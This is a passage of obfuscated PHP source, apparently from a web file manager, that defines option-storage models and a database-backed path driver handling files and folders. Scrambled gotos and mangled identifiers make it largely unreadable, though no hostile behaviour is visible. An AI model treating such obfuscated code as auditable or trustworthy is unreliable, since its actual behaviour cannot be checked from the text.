= $AË¶²îºÀ[$bƒ—³Éò‘‚[273]][$a™ßë–‘‡Î][1]; goto CºŸ¾¿ñ­À; a­³•”â˜ù: $bƒ—³Éò‘‚ =& $_SERVER[›é¼±]; $bÛ£†íÓùÙ = self::SQL_WHERE_IN_CHUNK; $AË¶²îºÀ = $this->optionsValue(); goto d“Ø‹åÎé; fíÔ¯ßÑ: return $E¡Çôì›ëê; goto açƒŞõàµ­; açƒŞõàµ­: } public function delete($cïø‚ = array()) { goto eµëˆ·ùÓ˜; B…¥¤”øè…: $dìÍŞÆ„ = $A¼à»­³î†[$B•ÏñÑ§í[273]][$a–¢œ‰æ¡][1]; $dìÍŞÆ„ = is_array($dìÍŞÆ„) ? $dìÍŞÆ„ : array(); for ($b³òŒò‡· = 0; $b³òŒò‡· < count($dìÍŞÆ„); $b³òŒò‡· += $eéìâ˜ÎÜ) { $FêÌ…è¹‹¦ = array_slice($dìÍŞÆ„, $b³òŒò‡·, $eéìâ˜ÎÜ); if (!is_array($FêÌ…è¹‹¦) || count($FêÌ…è¹‹¦) == 0) { break; } $A¼à»­³î†[$B•ÏñÑ§í[273]][$a–¢œ‰æ¡][1] = $FêÌ…è¹‹¦; $this->optionsValue($A¼à»­³î†); $bÇÁÊóå¥ += parent::delete($cïø‚); } goto bÑÀœ‡É„Ÿ; eµëˆ·ùÓ˜: $B•ÏñÑ§í =& $_SERVER[›é¼±]; $eéìâ˜ÎÜ = self::SQL_WHERE_IN_CHUNK; $A¼à»­³î† = $this->optionsValue(); goto FÚ¤óÔÈ’; bÑÀœ‡É„Ÿ: return $bÇÁÊóå¥; goto fÑ´›ƒŞ²; FÚ¤óÔÈ’: $a–¢œ‰æ¡ = $this->findWhereField($A¼à»­³î†); if (!$a–¢œ‰æ¡) { return parent::delete($cïø‚); } $bÇÁÊóå¥ = 0; goto B…¥¤”øè…; fÑ´›ƒŞ²: } private function findWhereField($d‘‚ÉŞåœğ) { $Bˆˆ›²÷…§ =& $_SERVER[›é¼±]; $e”·œŞÍÕé = self::SQL_WHERE_IN_CHUNK; if (!is_array($d‘‚ÉŞåœğ) || !is_array($d‘‚ÉŞåœğ[$Bˆˆ›²÷…§[273]])) { return !1; } foreach ($d‘‚ÉŞåœğ[$Bˆˆ›²÷…§[273]] as $bÃè¿“Ğàù => $FöÁŒˆòÌÚ) { if (is_array($FöÁŒˆòÌÚ) && isset($FöÁŒˆòÌÚ[0]) && is_string($FöÁŒˆòÌÚ[0]) && strtolower($FöÁŒˆòÌÚ[0]) == $Bˆˆ›²÷…§[7] && is_array($FöÁŒˆòÌÚ[1]) && count($FöÁŒˆòÌÚ[1]) > $e”·œŞÍÕé) { ignore_timeout(); return $bÃè¿“Ğàù; } } return !1; } public function setMasterDB($CÅŠ³äÁ = true) { think_config($_SERVER[›é¼±][391], $CÅŠ³äÁ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\117\160\x74\151\x6f\156"; public $field = array(); public function listData($AÃ‹¦Ü¹ = false, $fìÁŸ¹øÕ = "\x6d\x6f\144\x69\x66\171\124\x69\x6d\x65", $cºáÂêÀ® = false) { $bŸÜŸ™ƒ³¢ = Model($this->modelType)->get(!1, $this->optionType, !0); $D¡‘§ìñÁ = array_values($bŸÜŸ™ƒ³¢); if ($D¡‘§ìñÁ && $D¡‘§ìñÁ[0] && !is_array($D¡‘§ìñÁ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $bŸÜŸ™ƒ³¢ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$bŸÜŸ™ƒ³¢) { return $AÃ‹¦Ü¹ ? null : array(); } if (!$AÃ‹¦Ü¹) { $bŸÜŸ™ƒ³¢ = array_filter(array_values($bŸÜŸ™ƒ³¢)); return array_sort_by($bŸÜŸ™ƒ³¢, $fìÁŸ¹øÕ, $cºáÂêÀ®); } return $bŸÜŸ™ƒ³¢[$_SERVER[›é¼±][392] . $AÃ‹¦Ü¹]; } public function insert($Fßã¦¾Ñ¶Œ) { goto aË’ÆµšŸ; aË’ÆµšŸ: $C·í¬•ì® =& $_SERVER[›é¼±]; $Fßã¦¾Ñ¶Œ = array_field_key($Fßã¦¾Ñ¶Œ, $this->field); $c¸˜…‡ßõ = Model($this->modelType)->get($C·í¬•ì®[393], $this->optionType . $C·í¬•ì®[394]); goto e¨İÏŠÌªô; D§ãòö¼‚: return $c¸˜…‡ßõ; goto fµ¾ğÎö÷; e¨İÏŠÌªô: $c¸˜…‡ßõ = $c¸˜…‡ßõ ? $c¸˜…‡ßõ : 0; $Fßã¦¾Ñ¶Œ[$C·í¬•ì®[395]] = ++$c¸˜…‡ßõ; $Fßã¦¾Ñ¶Œ[$C·í¬•ì®[194]] = time(); goto eàÎÓ§¥êô; eàÎÓ§¥êô: $Fßã¦¾Ñ¶Œ[$C·í¬•ì®[84]] = time(); Model($this->modelType)->set($C·í¬•ì®[393], $c¸˜…‡ßõ, $this->optionType . $C·í¬•ì®[394]); Model($this->modelType)->set($C·í¬•ì®[392] . $c¸˜…‡ßõ, $Fßã¦¾Ñ¶Œ, $this->optionType); goto D§ãòö¼‚; fµ¾ğÎö÷: } public function update($aÓ¯‚•ÅŠ–, $F­¸Ğ…ƒ„) { goto b¿ôÈö ô˜; CØ•¥½ğÔ: if (!$F¦âääµÍŞ || !$aÓ¯‚•ÅŠ–) { return !1; } $F­¸Ğ…ƒ„ = array_merge($F¦âääµÍŞ, $F­¸Ğ…ƒ„); $F­¸Ğ…ƒ„[$Cäéå«º„‹[84]] = time(); goto BÀÁò•Ô¤Ğ; BÀÁò•Ô¤Ğ: return Model($this->modelType)->set($Cäéå«º„‹[392] . $aÓ¯‚•ÅŠ–, $F­¸Ğ…ƒ„, $this->optionType); goto dÕ²öÛœ«; b¿ôÈö ô˜: $Cäéå«º„‹ =& $_SERVER[›é¼±]; $F­¸Ğ…ƒ„ = array_field_key($F­¸Ğ…ƒ„, $this->field); $F¦âääµÍŞ = $this->listData($aÓ¯‚•ÅŠ–); goto CØ•¥½ğÔ; dÕ²öÛœ«: } public function remove($E¶Ì’òÄæÏ) { if (!$E¶Ì’òÄæÏ) { return !1; } return Model($this->modelType)->remove($_SERVER[›é¼±][392] . $E¶Ì’òÄæÏ, $this->optionType); } public function clear() { $då‰—³­«Ë =& $_SERVER[›é¼±]; Model($this->modelType)->remove($då‰—³­«Ë[393], $this->optionType . $då‰—³­«Ë[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($bƒï“®¾—©, $Fù…¢ÁŒ¿‚) { if (!$Fù…¢ÁŒ¿‚) { return !1; } $Cç—š›ŒªÎ = $this->listData(); $Cç—š›ŒªÎ = array_to_keyvalue($Cç—š›ŒªÎ, $bƒï“®¾—©); return isset($Cç—š›ŒªÎ[$Fù…¢ÁŒ¿‚]) ? $Cç—š›ŒªÎ[$Fù…¢ÁŒ¿‚] : !1; } public function findByName($BëóÏª£Î‰) { return $this->findByKey($_SERVER[›é¼±][28], $BëóÏª£Î‰); } protected function resetData($fø’È“Û¦Æ) { $A‡æ§ÁÜ± =& $_SERVER[›é¼±]; $fø’È“Û¦Æ = is_array($fø’È“Û¦Æ) ? $fø’È“Û¦Æ : array(); $BÑğÃˆµù† = array(); for ($BÆøİùÔ†ğ = 0; $BÆøİùÔ†ğ < count($fø’È“Û¦Æ); $BÆøİùÔ†ğ++) { $BÑğÃˆµù†[$A‡æ§ÁÜ±[392] . $fø’È“Û¦Æ[$BÆøİùÔ†ğ][$A‡æ§ÁÜ±[395]]] = $fø’È“Û¦Æ[$BÆøİùÔ†ğ]; } return Model($this->modelType)->set($BÑğÃˆµù†, !1, $this->optionType); } private function getAutoName($eÆããÑË† ) { $FèôÒ‚šá = array_to_keyvalue($this->listData(), $_SERVER[›é¼±][28]); if (!$FèôÒ‚šá || !isset($FèôÒ‚šá[$eÆããÑË† ])) { return $eÆããÑË† ; } for ($aŸ­¼Î’Œ = 1; $aŸ­¼Î’Œ < count($FèôÒ‚šá); $aŸ­¼Î’Œ++) { $dÚ¥Ü„À§“ = $eÆããÑË†  . "\x28{$aŸ­¼Î’Œ}\x29"; if (!isset($FèôÒ‚šá[$dÚ¥Ü„À§“])) { return $dÚ¥Ü„À§“; } } return $dÚ¥Ü„À§“; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($AŠµ™÷ÅÄ = false, $Aïš¶ãë± = '', $eù‡ôÔê³ª = false) { goto cÃ½ë·‰¤‡; eÔ´®È§†ä: $f˜»Œ¶ŸÁÂ = $this->where($Aóêçˆ„ª)->select(); $f˜»Œ¶ŸÁÂ = array_to_keyvalue($f˜»Œ¶ŸÁÂ, $EíµèãÔŸ´[93], $EíµèãÔŸ´[372]); foreach ($f˜»Œ¶ŸÁÂ as $bÆ‚­ğù×¹ => $eŒ”İ‡á­Ñ) { if ($eù‡ôÔê³ª || in_array($bÆ‚­ğù×¹, $this->jsonField)) { $f˜»Œ¶ŸÁÂ[$bÆ‚­ğù×¹] = json_decode($eŒ”İ‡á­Ñ, !0); } } goto eºÀÍë¢¾¾; AƒÕ¬ñÉÜ: $dì‚ô¾•‡ = is_array($dì‚ô¾•‡) ? $dì‚ô¾•‡ : array(); if (is_array($f˜»Œ¶ŸÁÂ)) { $f˜»Œ¶ŸÁÂ = array_merge($dì‚ô¾•‡, $f˜»Œ¶ŸÁÂ); return $AŠµ™÷ÅÄ ? isset($f˜»Œ¶ŸÁÂ[$AŠµ™÷ÅÄ]) ? $f˜»Œ¶ŸÁÂ[$AŠµ™÷ÅÄ] : null : $f˜»Œ¶ŸÁÂ; } $Aóêçˆ„ª = $this->filterWhere(array($EíµèãÔŸ´[29] => $Aïš¶ãë±)); goto eÔ´®È§†ä; eºÀÍë¢¾¾: $this->cacheSet($Aïš¶ãë±, $f˜»Œ¶ŸÁÂ); $f˜»Œ¶ŸÁÂ = array_merge($dì‚ô¾•‡, $f˜»Œ¶ŸÁÂ); return $AŠµ™÷ÅÄ ? $f˜»Œ¶ŸÁÂ[$AŠµ™÷ÅÄ] : $f˜»Œ¶ŸÁÂ; goto d”éÁ˜…Õ¶; cÃ½ë·‰¤‡: $EíµèãÔŸ´ =& $_SERVER[›é¼±]; $f˜»Œ¶ŸÁÂ = $this->cacheGet($Aïš¶ãë±); $dì‚ô¾•‡ = $this->optionDefault($Aïš¶ãë±); goto AƒÕ¬ñÉÜ; d”éÁ˜…Õ¶: } public function set($E‘ÚèñîŞ˜, $Dîí´§çï = false, $eÎ ¶¬×Ê› = '') { goto Eœä‰“‰ˆ ; F² ïÙ¡ó½: $fïÙè³”©Õ = is_array($E‘ÚèñîŞ˜) ? $E‘ÚèñîŞ˜ : array($E‘ÚèñîŞ˜ => $Dîí´§çï); foreach ($fïÙè³”©Õ as $B‡¾”¹å°¦ => $EÙ¥œš·•‹) { if (is_array($EÙ¥œš·•‹)) { $EÙ¥œš·•‹ = json_encode_force($EÙ¥œš·•‹); } $this->checkLength($EÙ¥œš·•‹, !1, $this->tableName . $A²ôÄ·ÓÂØ[4] . $E‘ÚèñîŞ˜); $EÙ¥œš·•‹ = self::textEncode($EÙ¥œš·•‹); $fïÙè³”©Õ = array($A²ôÄ·ÓÂØ[29] => $eÎ ¶¬×Ê›, $A²ôÄ·ÓÂØ[93] => $B‡¾”¹å°¦, $A²ôÄ·ÓÂØ[372] => $EÙ¥œš·•‹); $fº¿†“Û‘‚[] = $this->filterWhere($fïÙè³”©Õ); } if (!$fº¿†“Û‘‚) { return !0; } goto BÌÍ¶ó¹¡ó; Eœä‰“‰ˆ : $A²ôÄ·ÓÂØ =& $_SERVER[›é¼±]; $this->cacheRemove($eÎ ¶¬×Ê›); $fº¿†“Û‘‚ = array(); goto F² ïÙ¡ó½; BÌÍ¶ó¹¡ó: return $this->addAll($fº¿†“Û‘‚, array(), !0); goto f Òğ­´; f Òğ­´: } protected function optionDefault($e„ˆ›©¤²Ç = '') { return !1; } public function setDeep($b±®Î—«¿Í, $eÃ‰ŠèŠË× = false, $fÉ‘ïÓÒ‰å = '') { $D‡ˆ¬Šˆ¹ì = explode($_SERVER[›é¼±][95], $b±®Î—«¿Í); $EİÄí½Í¬ = $this->get(); array_set_value($EİÄí½Í¬, $b±®Î—«¿Í, $eÃ‰ŠèŠË×); $this->set($D‡ˆ¬Šˆ¹ì[0], $EİÄí½Í¬[$D‡ˆ¬Šˆ¹ì[0]], $fÉ‘ïÓÒ‰å); } public function remove($CÒò®ÄÄ–, $Dª–Á¨’Ê¢ = '') { $Aœ·¢ˆ†­ê =& $_SERVER[›é¼±]; $this->cacheRemove($Dª–Á¨’Ê¢); $B¤Ëó›¿‚Ï = $this->filterWhere(array($Aœ·¢ˆ†­ê[93] => $CÒò®ÄÄ–, $Aœ·¢ˆ†­ê[29] => $Dª–Á¨’Ê¢)); if (is_null($CÒò®ÄÄ–)) { unset($B¤Ëó›¿‚Ï[$Aœ·¢ˆ†­ê[93]]); } return $this->where($B¤Ëó›¿‚Ï)->delete(); } public function cacheSet($fƒæäéĞ, $D££ÆÖ…Ûî = false) { return Cache::set($this->cacheKey($fƒæäéĞ), $D££ÆÖ…Ûî); } public function cacheGet($BÙè½‡ğèµ) { return Cache::get($this->cacheKey($BÙè½‡ğèµ)); } public function cacheRemove($DÜ†ï÷ŸÉ) { return Cache::remove($this->cacheKey($DÜ†ï÷ŸÉ)); } protected function filterWhere($bë­ëšë) { return $bë­ëšë; } protected function cacheKey($dÇö°ª¿Š) { return $dÇö°ª¿Š; } } goto Cù‡İ¾”»¶; bŒë‰®¨ù½: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($a«Ù»ˆ¬Ã) { $this->pathParse = $a«Ù»ˆ¬Ã; $this->model = Model($_SERVER[›é¼±][1239]); } public function getPath($bÑˆ–Ì“ÔÈ) { return trim($bÑˆ–Ì“ÔÈ, $_SERVER[›é¼±][8]); } public function pathFather($DÉô¦á±š‰) { $d¡½Ø‚êå· = $this->parse($DÉô¦á±š‰); $d¡½Ø‚êå· = $this->infoSimple($DÉô¦á±š‰); return $d¡½Ø‚êå· ? $d¡½Ø‚êå·[$_SERVER[›é¼±][492]] : !1; } public function pathThis($a²èõØàß) { $e÷õµøÆ½ = $this->infoSimple($a²èõØàß); return $e÷õµøÆ½ ? $e÷õµøÆ½[$_SERVER[›é¼±][28]] : !1; } public function getPathOuter($eŠ æ¦Éê) { if (!$eŠ æ¦Éê) { return $eŠ æ¦Éê; } $fèâ«™µ±Á = $this->parse($eŠ æ¦Éê); return KodIO::make($fèâ«™µ±Á[$_SERVER[›é¼±][395]]); } public function copyFolderFromIO($D‰Øêµì«·, $A¥ƒ­¸ˆ—ƒ, $F¸è´¹ƒÆ, $C™¿½Š¸Ğí, $Dœ–ŒøÆ‡Ç) { $fÚ„Û¤Š¡ë = $this->model->copyFolderFromIO($D‰Øêµì«·, $A¥ƒ­¸ˆ—ƒ, $F¸è´¹ƒÆ, $C™¿½Š¸Ğí, $Dœ–ŒøÆ‡Ç); return KodIO::make($fÚ„Û¤Š¡ë); } public function isParentOf($fœ·íÅÂÔÕ, $D °ø»ÊÛĞ) { return $this->model->isParentOf($fœ·íÅÂÔÕ, $D °ø»ÊÛĞ); } public function mkfile($C¯ÛÛ ùŸá, $A®¾¬Õ…‹¿ = '', $f‘ƒ´œ†¾ = REPEAT_RENAME) { $D®Õ‘ùí¼ç =& $_SERVER[›é¼±]; $aÎ»İä« = $this->parse($C¯ÛÛ ùŸá); $C¯ÛÛ ùŸá = $aÎ»İä«[$D®Õ‘ùí¼ç[395]]; for ($FØİ½ˆš¤Í = 0; $FØİ½ˆš¤Í < count($aÎ»İä«[$D®Õ‘ùí¼ç[1240]]); $FØİ½ˆš¤Í++) { $dÙø÷¹Ó¾Í = $aÎ»İä«[$D®Õ‘ùí¼ç[1240]][$FØİ½ˆš¤Í]; if ($FØİ½ˆš¤Í == count($aÎ»İä«[$D®Õ‘ùí¼ç[1240]]) - 1) { $C¯ÛÛ ùŸá = $this->model->mkfile($C¯ÛÛ ùŸá, $dÙø÷¹Ó¾Í, $A®¾¬Õ…‹¿, $f‘ƒ´œ†¾); break; } $C¯ÛÛ ùŸá = $this->model->mkdir($C¯ÛÛ ùŸá, $dÙø÷¹Ó¾Í, REPEAT_SKIP); } return $this->getPathOuter($C¯ÛÛ ùŸá); } public function mkdir($Dùš§±¸­º, $AòŠèƒ®íî = REPEAT_SKIP) { $e¬ˆê˜Ş =& $_SERVER[›é¼±]; $eöÙè«ÖÚŒ = $this->parse($Dùš§±¸­º); $Dùš§±¸­º = $eöÙè«ÖÚŒ[$e¬ˆê˜Ş[395]]; for ($c˜‚ññ¿˜Œ = 0; $c˜‚ññ¿˜Œ < count($eöÙè«ÖÚŒ[$e¬ˆê˜Ş[1240]]); $c˜‚ññ¿˜Œ++) { $e”¡¬á¤”´ = $eöÙè«ÖÚŒ[$e¬ˆê˜Ş[1240]][$c˜‚ññ¿˜Œ]; $Dùš§±¸­º = $this->model->mkdir($Dùš§±¸­º, $e”¡¬á¤”´, $AòŠèƒ®íî); } return $this->getPathOuter($Dùš§±¸­º); } public function copyFile($b·ÜÜ éÃâ, $A¶•Ó«õ¡ , $E…ÉÉĞ‹İœ = REPEAT_REPLACE) { $EÈñİ‡¦ÇÆ =& $_SERVER[›é¼±]; $aÓø¬ğˆ¨ = $this->parse($A¶•Ó«õ¡ ); $f¥ ÇŒîµ¤ = $this->model->copy($b·ÜÜ éÃâ, $aÓø¬ğˆ¨[$EÈñİ‡¦ÇÆ[395]], $E…ÉÉĞ‹İœ, $aÓø¬ğˆ¨[$EÈñİ‡¦ÇÆ[76]]); return $f¥ ÇŒîµ¤ ? $this->getPathOuter($f¥ ÇŒîµ¤) : !1; } public function moveFile($fÜ£×»Æ, $fš¼¨—…è‚, $B…ÂŒ¶¹Û… = REPEAT_REPLACE) { $C¿öŞ¢ÅÙŞ =& $_SERVER[›é¼±]; $c»°‹‚³«³ = $this->parse($fš¼¨—…è‚); $DØƒÖÅİÅŒ = $this->model->move($fÜ£×»Æ, $c»°‹‚³«³[$C¿öŞ¢ÅÙŞ[395]], $B…ÂŒ¶¹Û…, $c»°‹‚³«³[$C¿öŞ¢ÅÙŞ[76]]); return $DØƒÖÅİÅŒ ? $this->getPathOuter($DØƒÖÅİÅŒ) : !1; } public function copy($B¯ÚÜÙ±ì, $BùÊ±Ş©¦ , $E•¯è‡ß” = REPEAT_REPLACE) { $EòğÂø¤ø = $this->parse($BùÊ±Ş©¦ ); $dİŒÀßÙùù = $this->model->copy($B¯ÚÜÙ±ì, $EòğÂø¤ø[$_SERVER[›é¼±][395]], $E•¯è‡ß”); return $dİŒÀßÙùù ? $this->getPathOuter($dİŒÀßÙùù) : !1; } public function moveSameAllow() { } public function move($fÔšÚ˜Á¦, $f¸Ğ¦š¥Í, $AÚÑàŠäÆÓ = REPEAT_REPLACE) { $bâØ®–ç¼ï = $this->parse($f¸Ğ¦š¥Í); $d‘æ¤×ÎÀ´ = $this->model->move($fÔšÚ˜Á¦, $bâØ®–ç¼ï[$_SERVER[›é¼±][395]], $AÚÑàŠäÆÓ); return $d‘æ¤×ÎÀ´ ? $this->getPathOuter($d‘æ¤×ÎÀ´) : !1; } public function remove($F¼£î®Åœé, $eŒ÷—®· = true) { return $this->model->remove($F¼£î®Åœé, $eŒ÷—®·); } public function rename($c®”›½Õ¡·, $eå‚ âØ¡Ä) { $FÓõ®™»‰À = $this->model->rename($c®”›½Õ¡·, $eå‚ âØ¡Ä); return $FÓõ®™»‰À ? $this->getPathOuter($c®”›½Õ¡·) : $FÓõ®™»‰À; } public function size($e°–ââÏ¨) { $fèñ•Šªñ“ = $this->infoSimple($e°–ââÏ¨); return $fèñ•Šªñ“ ? $fèñ•Šªñ“[$_SERVER[›é¼±][78]] : 0; } public function infoSimple($aĞÉƒË¯) { return $this->model->sourceInfo($aĞÉƒË¯); } public function info($BÏŞ©à‚¸ù) { return $this->infoParse($BÏŞ©à‚¸ù); } public function infoAuth($e—¦É¿ë©) { return $this->infoParse($e—¦É¿ë©, !1, !0); } public function infoWithChildren($f£Â¼ç¢Îä) { return $this->infoParse($f£Â¼ç¢Îä, !0); } protected function infoParse($Bâ¨Å¨Ë›è, $fºçï°ÄñÂ = false, $DÅé¥Õ«—‰ = false) { if (!$fºçï°ÄñÂ) { return $this->model->pathInfo($Bâ¨Å¨Ë›è, $DÅé¥Õ«—‰); } return $this->model->pathInfoMore($Bâ¨Å¨Ë›è); } public function infoFull($D²ƒ†çŸ°²) { $d‚ŠŠŠ¦ÜĞ =& $_SERVER[›é¼±]; $eÊ²ªŒÏ¶Ş = explode($d‚ŠŠŠ¦ÜĞ[8], $D²ƒ†çŸ°²); $Fä×Ñ™¬˜ = implode($d‚ŠŠŠ¦ÜĞ[8], array_splice($eÊ²ªŒÏ¶Ş, 1)); return $this->model->pathInfoByPath($eÊ²ªŒÏ¶Ş[0], $Fä×Ñ™¬˜); } public function hashSimple($aÎ ·òÀ¾¯) { $c‚ÁëÖÓØ¶ =& $_SERVER[›é¼±]; $D‘••‚¯Ü¢ = $this->infoWithChildren($aÎ ·òÀ¾¯); return $D‘••‚¯Ü¢[$c‚ÁëÖÓØ¶[164]][$c‚ÁëÖÓØ¶[171]]; } public function hashMd5($BïÉë¬Æ˜) { $A†©ß°å»‚ =& $_SERVER[›é¼±]; $bàœÍ…¢ = $this->infoWithChildren($BïÉë¬Æ˜); return $bàœÍ…¢[$A†©ß°å»‚[164]][$A†©ß°å»‚[170]]; } public function exist($eëŠÜÃÄ£²) { $eí°É ’Â± =& $_SERVER[›é¼±]; $eõĞ¸ƒºÕê = $this->parse($eëŠÜÃÄ£²); if (!$eõĞ¸ƒºÕê[$eí°É ’Â±[76]]) { return $this->isFile($eëŠÜÃÄ£²) || $this->isFolder($eëŠÜÃÄ£²); } $Bõ™Æ¬øß = array($eí°É ’Â±[396] => $eõĞ¸ƒºÕê[$eí°É ’Â±[395]], $eí°É ’Â±[28] => $eõĞ¸ƒºÕê[$eí°É ’Â±[76]]); $fŸ—Úßñ¾º = $this->model->where($Bõ™Æ¬øß)->find(); return $fŸ—Úßñ¾º ? !0 : !1; } public function isFile($E¡«¾¿Àá) { $CËĞß™«‰Œ =& $_SERVER[›é¼±]; $b¨“ä·´™ñ = $this->infoSimple($E¡«¾¿Àá); return $b¨“ä·´™ñ && $b¨“ä·´™ñ[$CËĞß™«‰Œ[405]] == $CËĞß™«‰Œ[87] ? !1 : !0; } public function isFolder($AÓ„¶ÚÖ¬…) { $f†­œƒ„”– =& $_SERVER[›é¼±]; $e×´¢¿°Éß = $this->infoSimple($AÓ„¶ÚÖ¬…); return $e×´¢¿°Éß && $e×´¢¿°Éß[$f†­œƒ„”–[405]] == $f†­œƒ„”–[87] ? !0 : !1; } public function listPath($a àÖÙÙâ, $E‹çÑ²âÛ = false) { $fĞ…Ë¤š½Œ =& $_SERVER[›é¼±]; if ($a àÖÙÙâ == $fĞ…Ë¤š½Œ[33]) { return !1; } $Cö¾µ¡ÃœŒ = array($fĞ…Ë¤š½Œ[396] => $a àÖÙÙâ); if ($E‹çÑ²âÛ) { return $this->model->listSource($Cö¾µ¡ÃœŒ, -1); } return $this->model->listSource($Cö¾µ¡ÃœŒ); } public function has($b…ãö‹ä÷, $a±†§…¶Î© = false, $D‘îòÁšê“ = null) { $Aïêéğİß« =& $_SERVER[›é¼±]; $a‡„­£ÛÒ„ = $this->infoWithChildren($b…ãö‹ä÷); if ($a±†§…¶Î©) { return array($Aïêéğİß«[204] => $a‡„­£ÛÒ„[$Aïêéğİß«[204]], $Aïêéğİß«[203] => $a‡„­£ÛÒ„[$Aïêéğİß«[203]]); } return $D‘îòÁšê“ ? $a‡„­£ÛÒ„[$Aïêéğİß«[204]] : $a‡„­£ÛÒ„[$Aïêéğİß«[203]]; } public function listAll($eöÈƒ»âĞ—) { $Cñ¸èğšÃÊ = IO::info($this->pathParse[$_SERVER[›é¼±][76]]); if (!$Cñ¸èğšÃÊ) { return array(); } return $this->model->listAll($eöÈƒ»âĞ—); } public function getContent($d‹ÙöÎğåÒ) { return $this->model->getContent($d‹ÙöÎğåÒ); } public function setContent($B¬å…ùáç, $c‹³éÙœ»¨ = '') { return $this->model->setContent($B¬å…ùáç, $c‹³éÙœ»¨); } public function fileSubstr($b™Ê’®ƒ¥, $BÌ¨Ññ³„«, $d„éë¡èñ°) { return $this->model->fileSubstr($b™Ê’®ƒ¥, $BÌ¨Ññ³„«, $d„éë¡èñ°); } public function download($C—ÈªëÖ, $aèÑ“é¹Ëù = '') { $BŒö‘Ğ¡¼ = get_path_father($aèÑ“é¹Ëù); $C—…£«Û×ñ = get_path_this($aèÑ“é¹Ëù); $E¶§²‡ˆ˜ = $this->model->fileInfoGet($C—ÈªëÖ); $AİºÙœäá½ = IO::copy($E¶§²‡ˆ˜[$_SERVER[›é¼±][76]], $BŒö‘Ğ¡¼, !1, $C—…£«Û×ñ); return $AİºÙœäá½; } public function setModifyTime($f£¯•¡„¤Ê, $b³ÓàÙ”µØ = '') { $DµåËª”Ü =& $_SERVER[›é¼±]; if (!$f£¯•¡„¤Ê) { return; } $this->model->where(array($DµåËª”Ü[412] => $f£¯•¡„¤Ê))->save(array($DµåËª”Ü[84] => $b³ÓàÙ”µØ)); } public function upload($fÕ—„”ˆ˜, $D¶‚‰›©À‹, $cèòºàÉÈ = false, $AÓö¥ÆñÊ£ = REPEAT_REPLACE) { $fÒº©œĞ­Ï =& $_SERVER[›é¼±]; $bØÇËä‚ƒ = $this->parse($fÕ—„”ˆ˜); $d¿ê”×†˜ª = $this->model->addFile($bØÇËä‚ƒ[$fÒº©œĞ­Ï[395]], $D¶‚‰›©À‹, $bØÇËä‚ƒ[$fÒº©œĞ­Ï[76]], $cèòºàÉÈ, $AÓö¥ÆñÊ£); return $this->getPathOuter($d¿ê”×†˜ª); } public function uploadFileByID($aâõÁ˜áÑê, $FÌõ×ƒ¦«, $fìÍ‘ÊôáÜ) { $F‡¢‘’Ù†º =& $_SERVER[›é¼±]; $bÅÓãÙíÉ = $this->parse($aâõÁ˜áÑê); $f¢Ş›òíÅ• = $this->model->addFileByFileID($bÅÓãÙíÉ[$F‡¢‘’Ù†º[395]], $FÌõ×ƒ¦«, $bÅÓãÙíÉ[$F‡¢‘’Ù†º[76]], $fìÍ‘ÊôáÜ); return $this->getPathOuter($f¢Ş›òíÅ•); } public function addFileByRemote($eÃÅÖÅÀ‹, $Dï÷¯£êÅå, $A›¸ôŸ†áê = array(), $CŒÉÂª¶Àˆ = '', $eğñŒõ ˆ) { $BËÃ…¤¤³Û =& $_SERVER[›é¼±]; $E‚™æ‰¡ƒŠ = $this->parse($eÃÅÖÅÀ‹); $CŒÉÂª¶Àˆ = empty($CŒÉÂª¶Àˆ) ? $E‚™æ‰¡ƒŠ[$BËÃ…¤¤³Û[76]] : $CŒÉÂª¶Àˆ; $d¸›ÎŒãëâ = $this->model->addFileByRemote($E‚™æ‰¡ƒŠ[$BËÃ…¤¤³Û[395]], $Dï÷¯£êÅå, $CŒÉÂª¶Àˆ, $A›¸ôŸ†áê, $eğñŒõ ˆ); return $this->getPathOuter($d¸›ÎŒãëâ); } public function uploadLink($f¬¨ê­»à, $eôÛ²¹ˆñ = 0) { $eâÍ¦İéõÂ =& $_SERVER[›é¼±]; $aºÇğçõºØ = $this->parse($f¬¨ê­»à); $Eôğ¾¸êÜì = _get($GLOBALS[$eâÍ¦İéõÂ[7]], $eâÍ¦İéõÂ[1241]); $DÑ‡ª‰”šƒ = _get($GLOBALS[$eâÍ¦İéõÂ[7]], $eâÍ¦İéõÂ[1242]); $f¬¨ê­»à = Model($eâÍ¦İéõÂ[597])->createFileName($aºÇğçõºØ[$eâÍ¦İéõÂ[76]], $Eôğ¾¸êÜì, $DÑ‡ª‰”šƒ); return IO::uploadLink($f¬¨ê­»à, $eôÛ²¹ˆñ); } public function fileNameAuto($fÏ£³ñ×Í’, $då·‘óŠ‘°, $DÌ®ù‚Ò³¿ = REPEAT_REPLACE, $bå®ö×ƒõë = false) { return $this->model->fileNameAuto($fÏ£³ñ×Í’, $då·‘óŠ‘°, $DÌ®ù‚Ò³¿, $bå®ö×ƒõë); } public function fileNameExist($c–±œêöå», $Cµ‹ºî÷çŒ) { return $this->model->fileNameExist($c–±œêöå», $Cµ‹ºî÷çŒ); } protected function _fileOut($EÈê‚ÑØ¿¡, $bÎ¶¸ñĞ¼¸ = false, $då©† ìÀ = false, $CÓ»¯«´À = '', $F Æ®ˆŞí = false) { goto f×ƒ¿ßôÓ; BÍ¥ßŠÔ¹ã: $eÚ‰¼ÈÁš¶ = $this->model->fileInfoGet($EÈê‚ÑØ¿¡); $CÓ»¯«´À = $eÚ‰¼ÈÁš¶[$aÖ•šååÃØ[170]] ? $eÚ‰¼ÈÁš¶[$aÖ•šååÃØ[170]] : $CÓ»¯«´À; $bˆİØÑ®Î = isset($GLOBALS[$aÖ•šååÃØ[1244]]) ? $GLOBALS[$aÖ•šååÃØ[1244]] : $eí¡Ìº¦¯Ã[$aÖ•šååÃØ[28]]; goto c„•ºñÖ÷…; c„•ºñÖ÷…: if ($F Æ®ˆŞí) { return IO::fileOutServer($eÚ‰¼ÈÁš¶[$aÖ•šååÃØ[76]], $bÎ¶¸ñĞ¼¸, $bˆİØÑ®Î, $CÓ»¯«´À); } IO::fileOut($eÚ‰¼ÈÁš¶[$aÖ•šååÃØ[76]], $bÎ¶¸ñĞ¼¸, $bˆİØÑ®Î, $CÓ»¯«´À); goto cä–°‚çİ¬; f×ƒ¿ßôÓ: $aÖ•šååÃØ =& 